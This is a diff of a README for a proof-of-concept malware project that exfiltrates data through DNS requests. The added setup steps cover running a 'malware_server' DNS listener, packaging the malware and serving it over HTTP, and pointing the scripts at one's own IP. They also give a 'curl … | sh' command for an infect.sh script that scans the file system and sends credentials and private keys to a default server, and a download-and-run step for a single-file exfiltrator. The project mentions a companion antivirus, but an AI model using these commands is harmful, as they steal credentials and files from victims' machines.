@@ -1,4 +1,4 @@
-# SwaggyPloop
+# lain 
 
 This project contains a proof of concept for a data exfiltration method that operates by leaking data through DNS requests. This can be used as a component for any malware that needs a communication channel to export sensitive files. For technical and implementation details, please see the included paper.
 
@@ -11,18 +11,49 @@ This project contains a proof of concept for a data exfiltration method that ope
 The accompanying antivirus can be found [here](https://github.com/CrMallard/Antibody)
 
 ## Setup
-This project requires Python `>=3.5` and runs best on a 64-bit Ubuntu `>=14.04` image. We have no guarantees for any other versions or distributions.
+The DNS server has been tested on `Debian 9.4 x64` please expect different results if you do not use that specific distribution of Linux. The underlying implementation of DNS is different for different distros that we tested. Debian is the one we optimized for.
+
+This project requires Python `>=3.5`. We have no guarantees for any other versions or distributions.
 
 ### Custom DNS Server
+Make sure you have `sqlite3` installed on your computer.
 ```
 pip install -r requirements.txt
 sudo python dns_server/malware_server.py # sudo is required to use port 53
 ```
 
-### Exfiltrating a file (proof of concept)
+### Running the Web Server
+Make sure you have `sqlite3` installed on your computer.
 ```
 pip install -r requirements.txt
-python client/malware_client.py <file> [ip address of dns server]
+cd web_interface
+export FLASK_APP=app.py
+flask run --host=0.0.0.0
+```
+
+### Packaging Malware and Running Distribution Server
+Make sure you are running a distribution of Linux. Install `pyinstaller`. Run the following command.
+```
+chmod +x package_malware.sh
+./package_malware.sh
+cd dist
+python -m SimpleHTTPServer
+```
+
+Now, with the Custom DNS server running, the Web Server running, and the Distribution Server running, you are ready to go.
+You can change the bash scripts `infect.sh` and `one_file.sh` to point to your IP address instead of our default one.
+
+
+### Exfiltrating a file example (will send to our default DNS server)
+```
+curl https://gist.githubusercontent.com/ColdSauce/a1ff11090994bd6e0c6731dcb407ba7a/raw/9d1456301d493dde762aa0aa7e6cac16e6da6e37/one_file.sh > one_file.sh
+chmod +x one_file.sh
+./one_file.sh <full path to file you would like to extract>
+```
+
+### Scanning entire file system and exfiltrating credentials and private keys
+```
+curl https://gist.githubusercontent.com/ColdSauce/c65f8d70da7ff04246d5da53534995f5/raw/9b191bbccf99d3da22064b87cd7130404e813442/infect.sh | sh
 ```
 
 ## Authors
